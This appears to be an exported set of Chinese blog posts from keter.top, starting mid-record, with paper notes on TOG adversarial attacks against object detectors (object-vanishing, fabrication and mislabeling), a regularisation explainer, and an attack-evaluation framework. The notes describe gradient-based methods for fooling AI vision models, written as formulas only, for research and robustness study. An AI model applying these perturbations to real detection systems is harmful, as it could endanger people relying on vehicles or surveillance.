LGAN−​D​=Ex∼pdata(x)​​[(D(x)−1)2]+Ex~∼p(x~∣x)​​[(D(x~))2]","categories":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}],"tags":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"「论文阅读」TOG: Targeted Adversarial Objectness Gradient Attacks on Real-time Object Detection Systems","slug":"【论文阅读】TOG-Targeted-Adversarial-Objectness-Gradient-Attacks-on-Real-time-Object-Detection-Systems","date":"2021-07-23T01:50:25.000Z","updated":"2021-08-13T14:37:10.000Z","comments":true,"path":"2021/07/23/【论文阅读】TOG-Targeted-Adversarial-Objectness-Gradient-Attacks-on-Real-time-Object-Detection-Systems/","link":"","permalink":"http://blog.keter.top/2021/07/23/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91TOG-Targeted-Adversarial-Objectness-Gradient-Attacks-on-Real-time-Object-Detection-Systems/","excerpt":"","text":"The rapid growth of real-time huge data capturing has pushed the deep learning and data analytic computing to the edge systems. Real-time object recognition on the edge is one of the representative deep neural network (DNN) powered edge systems for real-world mission-critical applications, such as autonomous driving and aug- mented reality. While DNN powered object detection edge systems celebrate many life-enriching opportunities, they also open doors for misuse and abuse. This paper presents three Targeted adversar- ial Objectness Gradient attacks, coined as TOG, which can cause the state-of-the-art deep object detection networks to suffer from object-vanishing, object-fabrication, and object-mislabeling attacks. We also present a universal objectness gradient attack to use ad- versarial transferability for black-box attacks, which is effective on any inputs with negligible attack time cost, low human perceptibil- ity, and particularly detrimental to object detection edge systems. We report our experimental measurements using two benchmark datasets (PASCAL VOC and MS COCO) on two state-of-the-art detection algorithms (YOLO and SSD). The results demonstrate serious adversarial vulnerabilities and the compelling need for de- veloping robust object detection systems. Edge 数据分析和作为边缘服务的深度学习已经吸引了业界和学术界的一系列研究和开发工作[5,9]。开源的深度目标检测网络[8,12,13]推动了新的边缘应用和边缘系统的部署，例如自动驾驶车辆上的交通标志识别和智能监控系统上的入侵检测[3]。然而，很少有人对实时深度目标检测器的漏洞进行系统的研究，这些漏洞对于边缘安全和隐私至关重要。图1显示了一个典型的场景，边缘系统从传感器(例如，摄像机)接收输入图像或视频帧，并在边缘设备(例如，带有人工智能加速模块的 Raspberry Pi)上运行一个实时 DNN 对象检测模型(例如，YOLOv3[12])。在没有攻击的情况下，训练有素的物体探测器可以处理良性输入(上图)并准确地识别街对面行走的人。然后一个对抗性的例子(底部) （从人眼视觉上看并没有什么不同 ）同样的物体检测器将被愚弄，输出错误的检测结果。 ¶介绍 在本文中，我们通过开发3种针对对抗性对象梯度攻击，提出了 DNN 对象保护系统的3个漏洞，作为一系列针对实时目标检测系统的 TOG 攻击。文献[4]虽然对 DNN 图像分类器进行了大量的对抗性攻击，但这些攻击主要是通过不同的攻击策略来确定 DNN 分类器的位置和每像素摄动量，从而对良性输入图像进行注入，导致 DNN 分类器产生错误的分类结果。相比之下，深度目标检测网络可以检测和分割单个图像或视频帧中可能视觉上重叠的多个对象，并为每个检测到的对象提供一个类标签。因此，深入了解 DNN 图像分类器中深层目标检测器的各种漏洞比误分类攻击更为复杂，因为 DNN 目标检测器具有更大、更多样的攻击面，如目标存在、目标定位、目标类标签等，为各种攻击目标和复杂性的攻击提供了更多的机会。TOG 攻击是目标检测网络上第一种针对不同对象语义的攻击方法，如使对象消失、制造更多的对象、给部分或全部对象贴错标签等。这些攻击中的每一个都注入了一个人类无法察觉的对抗性的 pertur-bation，以欺骗实时对象检测器，使其以三种不同的方式行为不当，如图2所示。图2(b)中的对象消失攻击使所有对象从 YOLOv3[12]检测器中消失。图2©中的物体制造攻击导致探测器高可信度地输出许多虚假物体。图2(d)中的对象错误标记攻击欺骗探测器错误标记(例如，停车标志变成了一把伞)。我们进一步提出了一个高效的通用对抗扰动算法，它产生一个单一的通用扰动，可以扰乱任何输入以有效地欺骗受害者检测器。鉴于攻击是离线生成的，通过利用对抗传输性，可以使用 TOG 通用扰动发起一个黑盒攻击，其在线攻击代价非常低(几乎为零) ，这在实时边缘对象检测应用程序中尤其致命。 ¶TOG ATTACKS 一般来说，深目标检测网络具有相似的输入与输出的结构。它们都采用输入图像或视频帧，通过bounding box技术为所有感兴趣的目标提供目标定位，并对每个检测到的目标进行分类，从而产生输出。TOG 攻击不受任何特定检测算法的限制，正如我们的实验评估所示。TOG 攻击不受任何特定检测算法的限制，正如我们的实验评估所示。给定一个输入图像 x，对象检测器首先检测大量的候选边框B^(x)={o^1,o^2,…,o^S}\\hat{\\mathcal{B}}(\\boldsymbol{x})=\\left\\{\\hat{\\boldsymbol{o}}_{1}, \\hat{\\boldsymbol{o}}_{2}, \\ldots, \\hat{\\boldsymbol{o}}_{S}\\right\\}B^(x)={o^1​,o^2​,…,o^S​}​​是宽和高。（都是目标检测的东西这里都不多说了） 一个敌对的例子 x ′是由良性输入 x 不断更新生成的，旨在让检测器检测错误。对抗性示例的生成过程可以公式化为： min⁡∥x′−x∥ps.t.O^(x′)=O∗,O^(x′)≠O^(x)\\min \\left\\|x^{\\prime}-x\\right\\|_{p} \\quad s.t. \\hat{O}\\left(x^{\\prime}\\right)=O^{*}, \\hat{O}\\left(x^{\\prime}\\right) \\neq \\hat{O}(x) min∥x′−x∥p​s.t.O^(x′)=O∗,O^(x′)​=O^(x) 其中 p 是距离度量，可以是L0范数，表示被改变的像素的百分比，L2范数计算欧几里得度量，或L∞L_{\\infty}L∞​表示目标攻击的目标检测值，或非目标攻击的目标检测值。 图3说明了使用 TOG 的对抗性攻击过程。首先给定一个输入源(例如，一个图像或视频帧) ，TOG 攻击模块使用敌方指定的配置来准备相应的对抗性扰动，这些扰动将被添加到输入中，导致检测器错误检测。TOG 中的前三个攻击: TOG-vanishing, TOG-fabrication,和 TOG-mislabeling，为每个输入量定制一个对抗性的扰动，而 TOG-universal 使用相同的通用扰动来破坏任何输入。 深度神经网络的训练通常从模型权值的随机初始化开始，然后通过求损失函数L\\mathcal{L}L的导数，使用下列方程，直到收敛为止: Wt+1=Wt−α∂E(x~,O)[L(x~;O,Wt)]∂Wt\\boldsymbol{W}_{t+1}=\\boldsymbol{W}_{t}-\\alpha \\frac{\\partial \\mathbb{E}_{(\\tilde{\\boldsymbol{x}}, \\boldsymbol{O})}\\left[\\mathcal{L}\\left(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}_{t}\\right)\\right]}{\\partial \\boldsymbol{W}_{t}} Wt+1​=Wt​−α∂Wt​∂E(x~,O)​[L(x~;O,Wt​)]​ 其中 α 是控制更新步长的学习速率。通过固定输入图像 x 和逐步更新模型权重 w 来训练深度目标检测网络，TOG 通过逆转训练过程来进行对抗性攻击。我们确定了受害者检测器的模型权重，并通过以下一般方程迭代更新输入图像 x，使其朝向由攻击类型确定的目标: 目标检测网络的优化目标可以用如下公式表述： L(x~;O,W)=Lobj(x~;O,W)+λnoobj Lnoobj (x~;O,W)+λloc⁡Lloc(x~;O,W)+Lprob(x~;O,W)\\begin{aligned} \\mathcal{L}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W})=&amp; \\mathcal{L}_{\\mathrm{obj}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W})+\\lambda_{\\text {noobj }} \\mathcal{L}_{\\text {noobj }}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}) \\\\ &amp;+\\lambda_{\\operatorname{loc}} \\mathcal{L}_{\\mathrm{loc}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W})+\\mathcal{L}_{\\mathrm{prob}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}) \\end{aligned} L(x~;O,W)=​Lobj​(x~;O,W)+λnoobj ​Lnoobj ​(x~;O,W)+λloc​Lloc​(x~;O,W)+Lprob​(x~;O,W)​ 下面是对公式具体项的一些公式： 检测目标和未检测目标的损失项： Lobj(x~;O,W)=∑i=1S[1iℓBCE(1,C^i)]Lnoobj(x~;O,W)=∑i=1S[(1−1i)ℓBCE(0,C^i)]\\begin{aligned} \\mathcal{L}_{\\mathrm{obj}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}) &amp;=\\sum_{i=1}^{S}\\left[\\mathbb{1}_{i} \\ell_{\\mathrm{BCE}}\\left(1, \\hat{C}_{i}\\right)\\right] \\\\ \\mathcal{L}_{\\mathrm{noobj}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}) &amp;=\\sum_{i=1}^{S}\\left[\\left(1-\\mathbb{1}_{i}\\right) \\ell_{\\mathrm{BCE}}\\left(0, \\hat{C}_{i}\\right)\\right] \\end{aligned} Lobj​(x~;O,W)Lnoobj​(x~;O,W)​=i=1∑S​[1i​ℓBCE​(1,C^i​)]=i=1∑S​[(1−1i​)ℓBCE​(0,C^i​)]​ 位置检测损失项：位置检测损失项：位置检测损失项： Lloc(x~;O,W)=∑i=1S1i[ℓSE(bix,b^ix)+ℓSE(biy,b^iy)+ℓSE(biW,b^iW)+ℓSE(biH,b^iH)]\\begin{aligned} \\mathcal{L}_{\\mathrm{loc}}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W}) &amp;=\\sum_{i=1}^{S} \\mathbb{1}_{i}\\left[\\ell_{\\mathrm{SE}}\\left(b_{i}^{x}, \\hat{b}_{i}^{x}\\right)+\\ell_{\\mathrm{SE}}\\left(b_{i}^{y}, \\hat{b}_{i}^{y}\\right)\\right.\\\\ &amp;\\left.+\\ell_{\\mathrm{SE}}\\left(\\sqrt{b_{i}^{W}}, \\sqrt{\\hat{b}_{i}^{W}}\\right)+\\ell_{\\mathrm{SE}}\\left(\\sqrt{b_{i}^{H}}, \\sqrt{\\hat{b}_{i}^{H}}\\right)\\right] \\end{aligned} Lloc​(x~;O,W)​=i=1∑S​1i​[ℓSE​(bix​,b^ix​)+ℓSE​(biy​,b^iy​)+ℓSE​(biW​​,b^iW​​)+ℓSE​(biH​​,b^iH​​)]​ 类别信息损失项： Lprob (x~;O,W)=∑i=1S1i∑c∈ classes ℓBCE(pic,p^ic)\\mathcal{L}_{\\text {prob }}(\\tilde{\\boldsymbol{x}} ; \\boldsymbol{O}, \\boldsymbol{W})=\\sum_{i=1}^{S} \\mathbb{1}_{i} \\sum_{c \\in \\text { classes }} \\ell_{\\mathrm{BCE}}\\left(p_{i}^{c}, \\hat{p}_{i}^{c}\\right) Lprob ​(x~;O,W)=i=1∑S​1i​c∈ classes ∑​ℓBCE​(pic​,p^​ic​) TOG的主要思路就是通过更改正常目标检测损失函数的输入，来达到扰乱检测网络的作用； 下面是他更改损失项的方法；","categories":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}],"tags":[{"name":"神经对抗攻击","slug":"神经对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"「基础知识」对于正则化的理解","slug":"【基础知识】对于正则化的理解","date":"2021-07-22T06:01:02.000Z","updated":"2021-08-13T14:35:08.000Z","comments":true,"path":"2021/07/22/【基础知识】对于正则化的理解/","link":"","permalink":"http://blog.keter.top/2021/07/22/%E3%80%90%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%91%E5%AF%B9%E4%BA%8E%E6%AD%A3%E5%88%99%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"这篇文章主要介绍L1和L2正则化是如何在梯度下降中工作的； 越往后学越意识到基础知识的重要性，这些基础知识可能在你前期理解的时候会比较费劲，但是当你真正的想要去对神经网络进行设计的时候就会体会到他们的重要性. 原文链接：https://towardsdatascience.com/intuitions-on-l1-and-l2-regularisation-235f2db4c261 过拟合是当前机器学习或统计模型针对特定数据集而无法推广到其他数据集时发生的现象。这通常发生在复杂的模型中，比如深度神经网络。 正则化是引入其他信息以防止过度拟合的过程。本文的重点是L1和L2正则化。 有很多解释，但老实说，它们有点太抽象了，我可能会忘记它们，最后访问这些页面，只是再次忘记。在本文中，我将通过梯度下降来解释为什么L1和L2起作用。梯度下降只是一种通过使用梯度值的迭代更新来找到 “正确” 系数的方法。(本文展示了如何在简单的线性回归中使用梯度下降。) ¶L1和L2是什么？ L1和L2正则化分别归因于向量w的L1和L2范数。下面有关范数的基础知识： 1-norm (also known as L1 norm)： ∥w∥1=∣w1∣+∣w2∣+…+∣wN∣\\|\\mathbf{w}\\|_{1}=\\left|w_{1}\\right|+\\left|w_{2}\\right|+\\ldots+\\left|w_{N}\\right| ∥w∥1​=∣w1​∣+∣w2​∣+…+∣wN​∣ 2-norm (also known as L2 norm or Euclidean norm)： ∥w∥2=(∣w1∣2+∣w2∣2+…+∣wN∣2)12\\|\\mathbf{w}\\|_{2}=\\left(\\left|w_{1}\\right|^{2}+\\left|w_{2}\\right|^{2}+\\ldots+\\left|w_{N}\\right|^{2}\\right)^{\\frac{1}{2}} ∥w∥2​=(∣w1​∣2+∣w2​∣2+…+∣wN​∣2)21​ p-norm ∥w∥p=(∣w1∣p+∣w2∣p+…+∣wN∣p)1p\\|\\mathbf{w}\\|_{p}=\\left(\\left|w_{1}\\right|^{p}+\\left|w_{2}\\right|^{p}+\\ldots+\\left|w_{N}\\right|^{p}\\right)^{\\frac{1}{p}} ∥w∥p​=(∣w1​∣p+∣w2​∣p+…+∣wN​∣p)p1​ 实现L1范数进行正则化的线性回归模型称为lasso regression，实现 (平方) L2范数进行正则化的线性回归模型称为岭回归。线性回归的模型对于这两种范数的实现是一样的。 y^=w1x1+w2x2+…+wNxN+b\\hat{y}=w_{1} x_{1}+w_{2} x_{2}+\\ldots+w_{N} x_{N}+b y^​=w1​x1​+w2​x2​+…+wN​xN​+b 但是在计算中损失函数包含这些正则项： 严格来说，最后一个方程 (岭回归) 是权重平方为L2范数的损失函数 (注意没有平方根)。 正则化项是 “约束”，在最小化损失函数时，优化算法必须通过该约束来 “坚持”。 ¶Model 让我们定义一个模型，看看L1和L2是如何工作的。为简单起见，我们用一个自变量定义了一个简单的线性回归模型。 y^=wx+b\\hat{y}=w x+by^​=wx+b 在这里，我使用了深度学习中的约定w ('weight ') 和b (‘bias’)。 在实际应用中，简单的线性回归模型不容易出现过拟合。如引言中所述，深度学习模型由于其模型复杂性而更容易出现此类问题。 因此，请注意，本文中使用的表达式很容易扩展到更复杂的模型，而不仅限于线性回归。 ¶损失函数 为了证明L1和L2正则化的效果，让我们使用3种不同的损失函数/目标拟合我们的线性回归模型。 我们的目标是尽量减少这些不同的损失。 ¶无正则化的损失函数 我们将损失函数L定义为平方误差，其中误差是y (真实值) 和 (预测值) 之间的差。 L=(y^−y)2=(wx+b−y)2\\begin{aligned} L &amp;=(\\hat{y}-y)^{2} \\\\ &amp;=(w x+b-y)^{2} \\end{aligned} L​=(y^​−y)2=(wx+b−y)2​ 让我们假设我们的模型将使用此损失函数进行过拟合。 ¶具有L1正则化的损失函数 根据上述损失函数，在其上添加一个L1正则化项如下所示: L1=(wx+b−y)2+λ∣w∣L_{1}=(w x+b-y)^{2}+\\lambda|w| L1​=(wx+b−y)2+λ∣w∣ 其中正则化参数 λ&gt; 0是手动调节的。我们把这个损失函数叫做L1。请注意，除了w = 0时，| w | 在任何地方都是可微的，如下所示。我们以后会需要这个。 d∣w∣dw={1w&gt;0−1w&lt;0\\frac{d|w|}{d w}=\\left\\{\\begin{array}{ll} 1 &amp; w&gt;0 \\\\ -1 &amp; w&lt;0 \\end{array}\\right. dwd∣w∣​={1−1​w&gt;0w&lt;0​ ¶具有L2正则化的损失函数 同样，将L2正则化项添加到L看起来是这样的： L2=(wx+b−y)2+λw2L_{2}=(w x+b-y)^{2}+\\lambda w^{2}L2​=(wx+b−y)2+λw2 同样，λ&gt; 0。 ¶梯度下降 现在，让我们根据上面定义的3个损失函数，使用梯度下降优化来求解线性回归模型。回想一下，更新梯度下降中的参数w如下: wnew =w−η∂L∂ww_{\\text {new }}=w-\\eta \\frac{\\partial L}{\\partial w}wnew ​=w−η∂w∂L​ 让我们用L，L1和L2的梯度替换上式中的最后一项 L: wnew =w−η∂L∂w=w−η⋅[2x(wx+b−y)]\\begin{aligned} w_{\\text {new }} &amp;=w-\\eta \\frac{\\partial L}{\\partial w} \\\\ &amp;=w-\\eta \\cdot[2 x(w x+b-y)] \\end{aligned} wnew ​​=w−η∂w∂L​=w−η⋅[2x(wx+b−y)]​ L1:L1:L1: wnew =w−η∂L1∂w=w−η⋅[2x(wx+b−y)+λd∣w∣dw]={w−η⋅[2x(wx+b−y)+λ]w&gt;0w−η⋅[2x(wx+b−y)−λ]w&lt;0\\begin{aligned} w_{\\text {new }} &amp;=w-\\eta \\frac{\\partial L_{1}}{\\partial w} \\\\ &amp;=w-\\eta \\cdot\\left[2 x(w x+b-y)+\\lambda \\frac{d|w|}{d w}\\right] \\\\ &amp;=\\left\\{\\begin{aligned} w-\\eta \\cdot[2 x(w x+b-y)+\\lambda] &amp; w&gt;0 \\\\ w-\\eta \\cdot[2 x(w x+b-y)-\\lambda] &amp; w&lt;0 \\end{aligned}\\right. \\end{aligned} wnew ​​=w−η∂w∂L1​​=w−η⋅[2x(wx+b−y)+λdwd∣w∣​]={w−η⋅[2x(wx+b−y)+λ]w−η⋅[2x(wx+b−y)−λ]​w&gt;0w&lt;0​​ L2:L2:L2: \\begin{aligned} w_{\\text {new }} &amp;=w-\\eta \\frac{\\partial L_{2}}{\\partial w} \\ &amp;=w-\\eta \\cdot[2 x(w x+b-y)+2 \\lambda w] \\end{aligned} ## 如何避免过拟合 从这里开始，让我们对上面的方程式进行以下替换 (以获得更好的可读性): - $\\eta=1$ - $H=2 x(w x+b-y)$ 接着我们就可以得到： L: w_{\\text {new }}=w-H \\longrightarrow(0) L1:L1: L1: w_{\\text {new }}=\\left{\\begin{array}{ll} (w-H)-\\lambda, &amp; w&gt;0 \\ (w-H)+\\lambda, &amp; w&lt;0 \\end{array}\\right. $L2:$ w_{\\text {new }}=(w-H)-2 \\lambda w-(2) ### 有正则化与没有正则化 观察有正则化参数 λ 和没有正则化参数 λ 的权重更新之间的差异。这里有一些地方可以很直观的看出。 Intuition A： 假设用等式0，计算w-H给我们一个w值，导致过拟合。然后，直觉上，公式15将减少过拟合的机会，因为引入 λ 使我们远离了前面说过的由于w导致的过拟合问题。 Intuition B： 一个过度拟合的模型意味着我们有一个非常适合我们模型的w值。“完美” 的意思是，如果我们将数据 (x) 替换回模型中，我们的预测将非常非常接近真实的y。当然，这很好，但是我们不想要完美。为什么？因为这意味着我们的模型仅适用于我们训练的数据集。这意味着我们的模型将产生与其他数据集的真实值相去甚远的预测。因此，我们满足于不那么完美，希望我们的模型也能与其他数据进行接近的预测。为此，我们用惩罚项 λ 在等式0中 “taint” 这个完美的w。就如公式15和16所示。 Intution C： 请注意，H 取决于模型 (w和b) 和数据 (x和y)。仅根据公式中的模型和数据更新权重会导致过拟合，从而导致模型泛化性不好。另一方面，在等式15，16中，w的最终值不仅受模型和数据的影响，而且还受与模型和数据无关的预定义参数 λ 的影响。因此，尽管值过大会导致模型严重欠拟合，如果我们设置适当的 λ 值就可以防止过拟合。 Intution D： 不同潜在训练集的权重会更相似——这意味着模型的方差减少了（相反，如果我们每次随机移动权重只是为了摆脱过度拟合的解决方案，方差不会改变）。 我们将为每个功能提供更小的权重。为什么这会减少过度拟合？我觉得很容易思考的方式是，在典型情况下，我们将有少量简单的特征，这些特征将解释大部分方差 (例如，y的大部分将由y_hat = ax+b解释); 但是如果我们的模型没有正则化，我们可以添加我们想要的更多功能来解释数据集的残差方差 (例如y_at = ax+bx ²+ cx ³ + e)，这自然会使得模型过度拟合训练。引入权重之和的惩罚意味着模型必须最佳地 “分配” 其权重，因此自然地，该 “资源” 的大部分将用于解释大部分方差的简单特征，而复杂特征的权重很小或为零。 ### L1 vs L2 &lt;img src=&quot;https://gitee.com/coronapolvo/images/raw/master/20210722134836image-20210722134828345.png&quot; alt=&quot;image-20210722134828345&quot; style=&quot;zoom:20%;&quot; /&gt; 比较上面每个等式的第二项。除H外，w的变化取决于 ± λ 项或-2λw项，这突出了以下内容的影响: 1. sign of current *w* (L1, L2) 2. magnitude of current *w* (L2) 3. doubling of the regularisation parameter (L2) 虽然使用L1的权重更新会受到第一点的影响，但来自L2的权重更新受所有这三个点的影响。虽然我只是根据迭代方程更新进行了比较，但请注意，这并不意味着一个比另一个 “更好”。 现在，让我们在下面看看如何仅通过当前w的符号就可以实现L1的正则化效应。 ### L1的稀疏性 看看方程3.1中的L1。如果w为正，则正则化参数 λ&gt;0将通过从w中减去 λ 来让w更小。相反，在等式3.2中，如果w为负，则 λ 将被加到w上，从而使其较少为负。因此，这具有将w推向0的效果。 这在1元线性回归模型中当然毫无意义，但其具有在多元回归模型中 “去除” 无用变量的能力。你也可以认为L1完全减少了模型中的特征数量。以下是L1试图在多元线性回归模型中 “推” 一些变量的示例： $\\hat{y}=0.4561 x_{1}-0.0007 x_{2}+0.3251 x_{3}+0.0009 x_{4}+0.0001 x_{5}-0.9142 x_{6}-0.553$ 那么，将w推向0如何有助于L1正则化中的过拟合？如上所述，随着w变为0，我们正在通过降低变量的重要性来减少功能的数量。在上面的方程式中，我们看到x_2，x_4和x_5由于系数小而几乎 “无用”，因此我们可以将它们从方程式中删除。这反过来降低了模型的复杂性，使我们的模型更简单。更简单的模型可以减少过拟合的机会。 Note： 虽然L1具有将权重推向0的影响，而L2没有，但这并不意味着由于L2的权重不能达到或者接近0。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「论文阅读」Understanding-Object-Detection-Through-An-Adversarial-Lens","slug":"【论文阅读】Understanding-Object-Detection-Through-An-Adversarial-Lens","date":"2021-07-20T06:01:02.000Z","updated":"2021-08-13T14:39:55.000Z","comments":true,"path":"2021/07/20/【论文阅读】Understanding-Object-Detection-Through-An-Adversarial-Lens/","link":"","permalink":"http://blog.keter.top/2021/07/20/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Understanding-Object-Detection-Through-An-Adversarial-Lens/","excerpt":"","text":"¶Abstract Deep neural networks based object detection models have revolutionized computer vision and fueled the development of a wide range of visual recognition applications. However, recent studies have revealed that deep object detectors can be compromised under adver- sarial attacks, causing a victim detector to detect no object, fake ob- jects, or mislabeled objects. With object detection being used perva- sively in many security-critical applications, such as autonomous vehi- cles and smart cities, we argue that a holistic approach for an in-depth understanding of adversarial attacks and vulnerabilities of deep object detection systems is of utmost importance for the research community to develop robust defense mechanisms. This paper presents a framework for analyzing and evaluating vulnerabilities of the state-of-the-art object detectors under an adversarial lens, aiming to analyze and demystify the attack strategies, adverse effects, and costs, as well as the cross-model and cross-resolution transferability of attacks. Using a set of quantitative metrics, extensive experiments are performed on six representative deep object detectors from three popular families (YOLOv3, SSD, and Faster R-CNN) with two benchmark datasets (PASCAL VOC and MS COCO). We demonstrate that the proposed framework can serve as a methodical benchmark for analyzing adversarial behaviors and risks in real-time ob- ject detection systems. We conjecture that this framework can also serve as a tool to assess the security risks and the adversarial robustness of deep object detectors to be deployed in real-world applications. ¶相关工作与问题陈述 目标检测是计算机视觉的核心任务，它以输入的图像或视频帧为对象，根据已知的类别检测出多个语义对象实例。尽管有些人可能将目标检测视为图像分类任务的概括，但深度目标检测器是一个多任务学习者，执行两个独特的学习任务，这使得攻击目标检测比图像分类更复杂，更具挑战性。（1）对象检测应该检测和识别封装在单个图像或视频帧中的多个语义对象的实例，而普通的图像分类器处理的是将每个图像分类为一个已知的类(2）目标检测是对单个图像中多个语义对象的多个实例进行局部化和分类，每个实例的定位精度会影响实例的分类精度。因此，针对图像分类器的对抗性攻击技术不适用于攻击深目标探测器。想要攻击目标检测网络则需要利用更复杂的攻击技术生成攻击目标检测模型的对抗性例子，通过同时迭代地最大化目标丢失、定位丢失和分类丢失，计算并向良性输入注入对抗性特征。 当下的目标检测网络主要可以分为单阶段目标检测网络与二阶段目标检测网络。二阶段的目标检测网络首先通过RPN层检测出目标区域，然后再使用分类器对区域进行分类。典型的例子有Faster R-CNN，R-CNN以及Mast R-CNN。单阶段的检测网络通过直接预测边界框的坐标来联合估计对象的边界框和类标签。这一块的代表就是YOLO和SSD。此外，不同的目标探测器，甚至来自同一个系列（例如，Faster R-CNN），可以使用不同的神经网络作为主干，另外一些还使用不同的输入分辨率来优化其检测性能。 白盒攻击，通过利用RPN来攻击Faster R-CNN，如DAG、UEA和其他类似方法[1,12]。例如，DAG首先（随机）为检测到的每个区域分配一个对抗性标签，然后执行迭代梯度反向传播来对提议进行错误分类。然而，以Faster R-CNN作为受害探测器的DAG攻击不能应用或推广到不使用RPN的单阶段探测器。类似于对图像分类器的黑盒转移攻击[18]，UEA[27]研究了攻击的可转移性，通过使用Faster R-CNN检测器生成的对抗性示例来攻击SSD检测器。 ¶攻击模块 下图中给出了proposed framework的概述。 ¶基于DNN的目标检测与对抗攻击 基于DNN的目标检测是一个多任务的学习问题，其目的是为了使目标的检测更加简单。这个任务的目标是最小化检测(1) object existence, (2) bounding boxes, and (3) class labels of detected objects 的误差。 下面是论文中对于训练一个目标检测神经网络的描述： 那么我们的攻击对象的目标就应该是生成一个x′x&#x27;x′使得： 尽管针对目标检测系统的对抗性攻击更加复杂，采用不同的公式，但它们通常利用公式（1）中一个或多个损失得出的梯度。这使得攻击算法能够细致地向输入图像注入扰动，使得输入中的微小变化将在受害者检测器的整个前向传播过程中被放大，并且变得足够大以改变一种或多种类型的预测结果（即，对象存在、边界框和类概率），下面我们分析了四种典型的目标检测系统攻击算法，了解了它们的特性，揭示了它们的工作原理。 ¶TOG TOG论文的作者基于迭代梯度方法开发了TOG攻击家族。使用梯度下降得到的恶意扰动让检测器给出所需的错误检测。在适当设置指定的检测 O∗(x)\\mathcal{O}^{*}(\\boldsymbol{x}) O∗(x) 以及攻击损失L∗\\mathcal{L}^{*}L∗下, TOG一般可表述为： TOG中提出了几种攻击方式，都是在上述公式的基础上做一些变形以达到不同的效果； ¶Untargeted attacks 非目标攻击欺骗受害者检测器随机误判，而不针对任何特定对象。如果对抗性示例可以让检测器给出任何形式的错误结果，例如让对象随机消失、伪造或错误标记，则认为此类攻击成功。 TOG利用了Lobj ,Lbbox , and Lclass \\mathcal{L}_{\\text {obj }}, \\mathcal{L}_{\\text {bbox }}, \\text { and } \\mathcal{L}_{\\text {class }} Lobj ​,Lbbox ​, and Lclass ​的梯度，并制定了要执行的攻击： 如表1第2列所示，检测器无法识别在第1列正常输入上检测到的任何正确对象，但具体的效果在不同的输入图像和攻击算法中有所不同。 ¶Object-vanishing attacks consistently Object-vanishing attacks consistently使得受害者探测器不能定位和识别任何物体。TOG Vanising利用Lobj\\mathcal{L}_{\\mathrm{obj}}Lobj​的梯度来确定对象是否存在，并将攻击公式化如下： xt+1′=∏x,ϵ[xt′−αTOGΓ(∇xt′Lobj(xt′,∅;θ))]\\boldsymbol{x}_{t+1}^{\\prime}=\\prod_{\\boldsymbol{x}, \\epsilon}\\left[\\boldsymbol{x}_{t}^{\\prime}-\\alpha_{\\mathrm{TOG}} \\Gamma\\left(\\nabla_{\\boldsymbol{x}_{t}^{\\prime}} \\mathcal{L}_{\\mathrm{obj}}\\left(\\boldsymbol{x}_{t}^{\\prime}, \\varnothing ; \\boldsymbol{\\theta}\\right)\\right)\\right] xt+1′​=x,ϵ∏​[xt′​−αTOG​Γ(∇xt′​​Lobj​(xt′​,∅;θ))] 专门针对目标消失的攻击，如果攻击成功，将使受害者探测器无法检测到任何目标，如表1第3列所示，在这两个示例中均未检测到任何目标。 ¶Targeted object-mislabeling attacks consistently 故名思义，这个攻击方法就是让检测器将目标检测的类别检测错误。用恶意选择的标签去替换真实的标签，同时保留正确的检测框位置。在保持其他两个部分的渐变不变的情况下，TOG-mislabeling从O∗(x)\\mathcal{O}^{*}(x)O∗(x)中的每个对象。Patch的更新公式如下： xt+1′=∏x,ϵ[xt′−αTOG⁡Γ(∇xt′L(xt′,O∗(x);θ))]\\boldsymbol{x}_{t+1}^{\\prime}=\\prod_{\\boldsymbol{x}, \\epsilon}\\left[\\boldsymbol{x}_{t}^{\\prime}-\\alpha_{\\operatorname{TOG}} \\Gamma\\left(\\nabla_{\\boldsymbol{x}_{t}^{\\prime}} \\mathcal{L}\\left(\\boldsymbol{x}_{t}^{\\prime}, \\boldsymbol{\\mathcal { O }}^{*}(\\boldsymbol{x}) ; \\boldsymbol{\\theta}\\right)\\right)\\right] xt+1′​=x,ϵ∏​[xt′​−αTOG​Γ(∇xt′​​L(xt′​,O∗(x);θ))] 